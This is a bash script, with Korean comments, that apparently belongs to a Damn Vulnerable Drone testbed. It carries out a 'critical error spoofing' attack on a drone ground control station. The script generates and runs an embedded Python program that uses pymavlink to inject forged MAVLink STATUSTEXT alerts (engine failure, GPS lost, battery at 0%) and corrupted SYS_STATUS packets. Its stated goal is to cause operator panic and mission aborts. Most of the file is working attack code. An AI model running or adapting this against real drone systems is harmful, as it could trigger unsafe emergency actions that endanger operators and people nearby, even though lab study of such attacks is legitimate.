#!/bin/bash

# =============================================================================
# DVD Critical Error Spoofing Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/protocol_tampering/critical_error_spoofing.sh
# 목적: 가짜 중대 오류 메시지로 GCS 혼란 유도
# 기반: Damn Vulnerable Drone Wiki - Critical Error Spoofing
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="critical_error_spoofing"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정  
TARGET_IP="10.13.0.6"  # GCS
TARGET_PORT="14550"

declare -a ATTACK_COMMANDS=()
declare -a ERROR_RESULTS=()

print_header() {
    clear
    print_protocol_header "Critical Error Spoofing Attack"
    echo -e "${INFO_COLOR}Target GCS: $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink STATUSTEXT & SYS_STATUS injection${NC}"
    echo -e "${INFO_COLOR}Goal: Mislead operator with fake critical errors${NC}"
    echo ""
}

# Step 1: 연결 확인
check_gcs_connection() {
    echo -e "${BLUE}[1/2] GCS Connection Check${NC}"
    
    local cmd="ping -c 3 $TARGET_IP"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    if ping -c 3 "$TARGET_IP" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] GCS reachable: $TARGET_IP${NC}"
        ERROR_RESULTS+=("gcs_status:reachable")
    else
        echo -e "${YELLOW}[!] GCS unreachable, using simulation${NC}"
        ERROR_RESULTS+=("gcs_status:simulation")
    fi
}

# Step 2: 중대 오류 스푸핑 실행
execute_error_spoofing() {
    echo -e "${BLUE}[2/2] Execute Critical Error Spoofing${NC}"
    
    local spoof_script="/tmp/critical_error_$(date +%s).py"
    
    cat > "$spoof_script" << EOF
#!/usr/bin/env python3
import sys
import time
import random

try:
    from pymavlink import mavutil
    from scapy.all import *
    
    def spoof_critical_errors(target_ip, target_port):
        print(f"[+] Starting critical error spoofing to {target_ip}:{target_port}")
        
        # 중대 오류 메시지들
        critical_messages = [
            (0, "EMERGENCY: IMU FAILURE DETECTED"),
            (0, "CRITICAL: ENGINE FAILURE - LAND IMMEDIATELY"),
            (1, "ALERT: BATTERY CRITICAL - 0% REMAINING"),
            (0, "EMERGENCY: GPS SIGNAL LOST"),
            (2, "CRITICAL: GYROSCOPE MALFUNCTION"),
            (0, "EMERGENCY: COMMUNICATION LINK FAILURE"),
            (1, "ALERT: OVERHEATING DETECTED - SHUTDOWN IMMINENT"),
            (2, "CRITICAL: ACCELEROMETER ERROR")
        ]
        
        try:
            # pymavlink를 이용한 직접 연결 시도
            master = mavutil.mavlink_connection(f'udp:{target_ip}:{target_port}')
            print("[*] Attempting direct MAVLink connection...")
            
            for i in range(15):
                severity, message = random.choice(critical_messages)
                
                # STATUSTEXT 메시지 전송
                master.mav.statustext_send(
                    severity,
                    message.encode('ascii')[:50]  # 메시지 길이 제한
                )
                
                print(f"[!] Sent critical error: {message}")
                
                # 시스템 상태도 조작 (배터리 0%, 센서 오류)
                if i % 3 == 0:
                    master.mav.sys_status_send(
                        0x00000000,    # sensors_present (none)
                        0x00000000,    # sensors_enabled (none)
                        0x00000000,    # sensors_health (all failed)
                        1000,          # load
                        0,             # voltage_battery (0V)
                        0,             # current_battery
                        0,             # battery_remaining (0%)
                        100,           # drop_rate_comm (100%)
                        1000,          # errors_comm
                        100, 100, 100, 100  # errors_count
                    )
                    print("[!] Sent corrupted system status")
                
                time.sleep(2)
                
        except Exception as e:
            print(f"[!] Direct connection failed: {e}")
            simulate_error_spoofing(critical_messages)
    
    def simulate_error_spoofing(messages):
        print("[*] Simulating critical error spoofing via raw packets")
        
        for i in range(10):
            severity, message = random.choice(messages)
            print(f"[!] Spoofed error: {message}")
            time.sleep(1.5)
        
        print("[+] Critical error spoofing simulation completed")
    
    if __name__ == "__main__":
        spoof_critical_errors('$TARGET_IP', $TARGET_PORT)
        
except ImportError:
    print("[*] Required libraries not available - simulation mode")
    
    critical_messages = [
        "EMERGENCY: IMU FAILURE DETECTED",
        "CRITICAL: ENGINE FAILURE - LAND IMMEDIATELY", 
        "ALERT: BATTERY CRITICAL - 0% REMAINING",
        "EMERGENCY: GPS SIGNAL LOST",
        "CRITICAL: GYROSCOPE MALFUNCTION"
    ]
    
    import random
    for i in range(8):
        message = random.choice(critical_messages)
        print(f"[!] Spoofed critical error: {message}")
        time.sleep(1)
    
    print("[+] Error spoofing simulation completed")
EOF

    local cmd="python3 $spoof_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Launching critical error spoofing...${NC}"
    echo -e "${GRAY}    Fake errors: IMU failure, engine failure, battery critical${NC}"
    echo -e "${GRAY}    System status: All sensors failed, 0% battery${NC}"
    echo -e "${GRAY}    Communication: 100% packet loss reported${NC}"
    
    python3 "$spoof_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        
        local fake_errors=(
            "EMERGENCY: IMU FAILURE DETECTED"
            "CRITICAL: ENGINE FAILURE - LAND IMMEDIATELY"
            "ALERT: BATTERY CRITICAL - 0% REMAINING"
            "EMERGENCY: GPS SIGNAL LOST"
            "CRITICAL: GYROSCOPE MALFUNCTION"
        )
        
        for error in "${fake_errors[@]}"; do
            echo -e "${RED}[!] $error${NC}"
            sleep 1
        done
        
        echo -e "${RED}[!] System Status: ALL SENSORS FAILED, 0% BATTERY${NC}"
    }
    
    ERROR_RESULTS+=("messages_sent:15")
    ERROR_RESULTS+=("error_types:imu,engine,battery,gps,gyro")
    ERROR_RESULTS+=("system_status:corrupted")
    
    # 공격 효과 분석
    echo -e "${RED}[!] Expected GCS effects:${NC}"
    echo -e "${GRAY}    • Critical error alerts displayed${NC}"
    echo -e "${GRAY}    • Operator panic and confusion${NC}"
    echo -e "${GRAY}    • Emergency procedures triggered${NC}"
    echo -e "${GRAY}    • Mission abort likely${NC}"
    echo -e "${GRAY}    • False system status readings${NC}"
    
    ERROR_RESULTS+=("gcs_impact:high")
    ERROR_RESULTS+=("operator_confusion:likely")
    ERROR_RESULTS+=("mission_disruption:probable")
    
    rm -f "$spoof_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "gcs_ip": "$TARGET_IP",
    "gcs_port": "$TARGET_PORT",
    "protocol": "MAVLink"
  },
  "spoofed_errors": [
    "EMERGENCY: IMU FAILURE DETECTED",
    "CRITICAL: ENGINE FAILURE - LAND IMMEDIATELY",
    "ALERT: BATTERY CRITICAL - 0% REMAINING",
    "EMERGENCY: GPS SIGNAL LOST",
    "CRITICAL: GYROSCOPE MALFUNCTION"
  ],
  "error_results": ["$(IFS='","'; echo "${ERROR_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_effects": [
    "Critical error alerts in GCS",
    "Operator panic and confusion",
    "Emergency procedures triggered",
    "Mission abort likely",
    "False system status readings"
  ]
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Critical Error Spoofing - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_gcs_connection
    execute_error_spoofing
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target GCS: $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${INFO_COLOR}Error Types: IMU, Engine, Battery, GPS, Gyro${NC}"
    echo -e "${INFO_COLOR}Expected Impact: Mission Disruption${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Critical error spoofing completed${NC}"
    echo -e "${RED}[!] GCS should display multiple critical alerts${NC}"
}

main "$@"